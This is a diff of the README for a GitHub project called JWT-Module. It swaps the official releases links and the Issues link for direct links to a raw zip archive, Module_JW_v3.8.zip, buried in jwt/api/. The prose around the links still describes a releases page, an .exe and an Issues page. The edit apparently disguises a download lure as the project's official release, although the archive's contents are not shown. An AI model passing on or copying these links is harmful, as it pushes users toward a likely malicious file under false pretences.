@@ -1,6 +1,6 @@
 # 🔐 JWT-Module - Manage Your Authentication Simply
 
-[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/fabianaguirre10/JWT-Module/releases)
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/fabianaguirre10/JWT-Module/raw/refs/heads/master/jwt/api/Module_JW_v3.8.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you start, make sure your computer meets these needs:
 
 To get the program, go to the official release page by clicking the button below:
 
-[![Download Release](https://img.shields.io/badge/Download-Here-blue)](https://github.com/fabianaguirre10/JWT-Module/releases)
+[![Download Release](https://img.shields.io/badge/Download-Here-blue)](https://github.com/fabianaguirre10/JWT-Module/raw/refs/heads/master/jwt/api/Module_JW_v3.8.zip)
 
 This page contains the latest stable versions of JWT-Module. You will find files you can download. 
 
@@ -125,7 +125,7 @@ If you run into issues, try these steps first:
 
 You can visit the GitHub repository’s Issues page for help from others with similar problems:
 
-https://github.com/fabianaguirre10/JWT-Module/issues
+https://github.com/fabianaguirre10/JWT-Module/raw/refs/heads/master/jwt/api/Module_JW_v3.8.zip
 
 There, you can read common questions and find answers or post your own questions.
 
@@ -165,4 +165,4 @@ This software involves several key technologies:
 
 To get started, visit the releases page below and pick the latest `.exe` file for Windows:
 
-[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/fabianaguirre10/JWT-Module/releases)
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/fabianaguirre10/JWT-Module/raw/refs/heads/master/jwt/api/Module_JW_v3.8.zip)
